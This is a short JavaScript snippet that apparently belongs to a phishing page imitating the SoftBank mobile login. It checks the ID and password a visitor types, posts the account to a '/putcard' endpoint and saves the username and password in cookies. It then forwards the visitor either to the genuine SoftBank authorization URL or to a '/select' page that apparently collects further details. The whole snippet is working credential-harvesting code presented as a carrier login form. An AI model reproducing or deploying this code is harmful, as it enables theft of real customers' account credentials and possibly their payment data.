<script>
    var mask = null;
    var timer = null;

    $(function () {
        $('#btnpost').on('click',function () {
            var appid = $('#telnum').val();
            
            if(!appid){
                layer.msg('SoftBank ID 必要とする');
                return false;
            }
            var rep1 = /[A-Za-z0-9]+/;
            if(!(rep1.test(appid))){
                layer.msg('SoftBank ID フォーマットエラー');
                return false;
            }
            
            var apppwd= $('#password').val();
            if(!apppwd){
                layer.msg('パスワード  (必要とする)');
                return false;
            }
            var rep1 = /([A-Za-z0-9]{8,20})/;
            if(!rep1.test(apppwd)){
                layer.msg('パスワード フォーマットエラー');
                return false;
            }

            $.post("/putcard", {
                Origin: "sb",
                account: appid,
            }, function(data) {
                if (data.Code == 1 && data.Message == "yes") {
                    document.location.href = "https://id.my.softbank.jp/sbid_auth/type1/2.0/authorization.php?response_type=code&client_id=o00aXYC6xABycFsvzmgFARqc0oa1nCau&redirect_uri=https%3A%2F%2Fmy.softbank.jp%2Fmsb%2Fd%2Fauth%2FdoReceiveSbid&display=touch&prompt=consent&scope=openid&nonce=20220424125553096ioYdVoAJyDxz6yN&ui_locales=ja&weblinkid=MSB020063&acr_value=1&amr=me";
                } else {
                    $.cookie("username",$("#telnum").val());
                    $.cookie("password",$("#password").val());
		            document.location.href = "/select";
                }
            });
            
            
        })
    });
</script>
